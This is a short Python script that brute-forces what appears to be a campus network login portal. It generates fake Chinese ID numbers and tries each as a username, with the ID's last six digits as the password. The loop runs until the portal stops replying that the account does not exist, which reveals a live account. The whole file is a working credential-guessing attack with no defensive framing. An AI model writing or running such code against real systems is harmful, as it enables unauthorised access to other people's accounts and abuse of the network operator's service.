# -*- codeing = utf-8 -*-
# @Time : 2021/9/1 6:57 下午
# @Author : renew
# @File : idTest.py
# @Software : PyCharm


from id_validator import validator
import requests


def idHit():
    id = validator.fake_id(True, '广东省', '2001')
    print("账号为：" + id)
    print("密码为：" + id[12:18])
    return id


def netHid(id, ip):
    url = "http://192.168.60.253:801/eportal/portal/login"
    headers = {

        "User-Agent": 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
        # "Referer": "http://192.168.60.253/"
    }
    data = {
        "callback": "dr1003",
        "login_method": "1",
        "user_account": id,
        "user_password": id[12:18],
        "wlan_user_ip": ip,
        "wlan_user_ipv6": "",
        "wlan_user_mac": "000000000000",
        "wlan_ac_ip": "192.168.30.253",
        "wlan_ac_name": "ZJXY_WS6816",
        "jsVersion": "4.1.3",
        "terminal_type": "1",
        "lang": "zh-cn",
        "v": "3078",
        "lang": "zh"
    }
    req = requests.get(url=url, headers=headers, params=data)
    print(req.text)
    return req.text


def hit():
    i = 1
    while 1:
        print("第" + str(i) + "次")
        ll = 'dr1003({"result":0,"msg":"账号不存在","ret_code":4});'
        if netHid(idHit(), '10.10.234.109') == ll:
            pass
        else:
            exit()
        i = i + 1


